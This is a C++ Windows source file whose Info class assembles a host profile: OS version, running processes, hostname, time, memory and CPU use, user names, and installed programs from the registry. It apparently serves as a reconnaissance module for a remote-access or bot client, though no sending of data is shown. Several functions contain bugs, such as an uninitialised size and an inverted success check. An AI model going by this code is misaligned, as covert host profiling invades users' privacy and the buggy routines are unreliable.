#include "stdafx.h"
#include "Info.h"
#include "Util.h"

// Use to convert bytes to MB
#define DIV 1048576

Info info;

static bool GetOSVersion(std::tstring& str)
{
	OSVERSIONINFO osVersionInfo;

	ZeroMemory(&osVersionInfo, sizeof(OSVERSIONINFO));
	osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	// TODO: this function is deprecated since Windows 8?
	GetVersionEx(&osVersionInfo);

	str += std::to_tstring(osVersionInfo.dwMajorVersion);
	str += _T(".");
	str += std::to_tstring(osVersionInfo.dwMinorVersion);
	str += _T(".");
	str += std::to_tstring(osVersionInfo.dwBuildNumber);

	return true;
}
static bool GetProcessInfoStr(DWORD processID, std::tstring& str)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
		FALSE, processID);

	if(hProcess == NULL) {
		return false;
	}

	HMODULE hMod;
	DWORD bytesNeeded;

	if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &bytesNeeded)) {
		TCHAR processName[MAX_PATH];
		if (GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(TCHAR))) {
			str += processName;
			return true;
		}
	}

	return false;
}

static bool EnumerateProcesses(std::tstring& str)
{
	DWORD processes[1024];
	DWORD bytesNeeded;
	DWORD processCount;
	size_t i;

	if(!EnumProcesses(processes, sizeof(processes), &bytesNeeded)) {
		return false;
	}

	processCount = bytesNeeded / sizeof(DWORD);

	for(i = 0; i < processCount; i++) {
		if(processes[i] != 0) {
			if(GetProcessInfoStr(processes[i], str)) {
				str += _T(";");
			}
		}
	}

	return true;
}

static bool GetHostname(std::tstring& str)
{
	TCHAR buffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size;

	if(GetComputerName(buffer, &size) != 0) {
		str += std::tstring(buffer, size);
		return true;
	} else {
		str += _T("unknown");
		return false;
	}
}

static bool GetTime(std::tstring &str)
{
	SYSTEMTIME sysTime;

	ZeroMemory(&sysTime, sizeof(SYSTEMTIME));
	GetLocalTime(&sysTime);

	str += std::to_tstring(sysTime.wDay);
	str += _T(".");
	str += std::to_tstring(sysTime.wMonth);
	str += _T("."),
	str += std::to_tstring(sysTime.wYear);
	str += _T(" ");
	str += std::to_tstring(sysTime.wHour);
	str += _T(":");
	str += std::to_tstring(sysTime.wMinute);
	str += _T(":");
	str += std::to_tstring(sysTime.wSecond);

	return true;
}

static bool GetMemoryStatus(std::tstring& str)
{
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);

	if (GlobalMemoryStatusEx(&statex)) {
		str += _T("total:");
		str += std::to_tstring(statex.ullTotalPhys / DIV);
		str += _T(";");

		str += _T("free:");
		str += std::to_tstring(statex.ullAvailPhys / DIV);
		str += _T(";");
		
		return true;
	} else {
		return false;
	}
}

static bool GetCPULoad(std::tstring& str)
{
	static DWORD dwLastProcessTime = 0;
	static DWORD dwLastSystemTime = 0;
	static double dCPULoad = 0;
	FILETIME ftCreationTime, ftExitTime, ftKernelTime, ftUserTime;
	ULARGE_INTEGER uiKernelTime, uiUserTime;

	GetProcessTimes(GetCurrentProcess(), &ftCreationTime, &ftExitTime, &ftKernelTime, &ftUserTime);

	uiKernelTime.HighPart = ftKernelTime.dwHighDateTime;
	uiKernelTime.LowPart = ftKernelTime.dwLowDateTime;
	uiUserTime.HighPart = ftUserTime.dwHighDateTime;
	uiUserTime.LowPart = ftUserTime.dwLowDateTime;

	DWORD dwActualProcessTime = (DWORD)((uiKernelTime.QuadPart + uiUserTime.QuadPart) / 100);
	DWORD dwActualSystemTime = GetTickCount();

	if(dwLastSystemTime) {
		dCPULoad = (double)(dwActualProcessTime - dwLastProcessTime) / (dwActualSystemTime - dwLastSystemTime);
	}
	dwLastProcessTime = dwActualProcessTime;
	dwLastSystemTime = dwActualSystemTime;

	str += std::to_tstring(dCPULoad);

	return true;
}

static bool GetUsernameReal(std::tstring& str)
{
	TCHAR buffer[1024] = { 0 };
	ULONG size = sizeof(buffer);

	if(GetUserNameEx(NameDisplay, buffer, &size)) {
		str += std::tstring(buffer, size);
		return true;
	} else {
		str += _T("unknown");
		return false;
	}
}

static bool GetUsernameLogin(std::tstring& str)
{
	TCHAR buffer[1024] = { 0 };
	ULONG size = sizeof(buffer);

	if(GetUserName(buffer, &size) == 0) {
		str += std::tstring(buffer, size);
		return true;
	} else {
		str += _T("unknown");
		return false;
	}
}

static bool GetProgramList(std::tstring& str)
{
	HKEY hKey = { 0 };
	LPCTSTR path = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
	HRESULT status;

	status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_ENUMERATE_SUB_KEYS | KEY_WOW64_64KEY, &hKey);

	if(status != ERROR_SUCCESS) {
		return false;
	}

	DWORD index = 0;
	TCHAR keyName[256] = { 0 };
	DWORD keyLen = 256;

	while(RegEnumKeyEx(hKey, index++, keyName, &keyLen, 0, 0, 0, 0) == ERROR_SUCCESS) {
		keyLen = 256;

		HKEY hSubKey = { 0 };
		if(RegOpenKeyEx(hKey, keyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
			TCHAR dest[256];
			DWORD size = 256;

			status = RegQueryValueEx(hSubKey, _T("DisplayName"), NULL, NULL, (LPBYTE)dest, &size);
			if(status != ERROR_SUCCESS) {
				continue;
			}

			// ignore size?
			str += std::tstring(dest);
			str += _T(";");
		}
	}

	return true;
}

Info::Info()
{
	// Has to be called atleast one time until we can use its value
	std::tstring dummy;
	GetCPULoad(dummy);
}

Info::~Info()
{
}

void Info::GetInformation(std::tstring& str)
{
	str += _T("osVer:");
	GetOSVersion(str);
	str += _T("\n");

	str += _T("procs:");
	EnumerateProcesses(str);
	str += _T("\n");

	str += _T("hostname:");
	GetHostname(str);
	str += _T("\n");

	str += _T("time:");
	GetTime(str);
	str += _T("\n");

	str += _T("memory-usage:");
	GetMemoryStatus(str);
	str += _T("\n");

	str += _T("cpu-usage:");
	GetCPULoad(str);
	str += _T("\n");

	str += _T("name-real:");
	GetUsernameReal(str);
	str += _T("\n");

	str += _T("name-login:");
	GetUsernameLogin(str);
	str += _T("\n");

	str += _T("programs:");
	GetProgramList(str);
	str += _T("\n");
}